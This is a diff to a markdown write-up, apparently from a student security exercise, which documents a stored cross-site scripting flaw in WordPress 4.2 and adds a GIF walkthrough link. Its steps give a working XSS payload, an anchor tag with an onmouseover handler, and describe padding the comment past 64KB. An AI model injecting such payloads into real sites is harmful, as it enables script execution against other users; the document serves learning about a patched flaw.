@@ -12,7 +12,7 @@ Time Spend: TBA hours in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough:
-  
+  ![](Vulnerability1.gif)
   - [ ] Steps to recreate:
     1. Write a comment in wordpress by first writting "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px" without quotes.
     2. Then after that add on to the comment until the size of the comment is greater than 64kb.
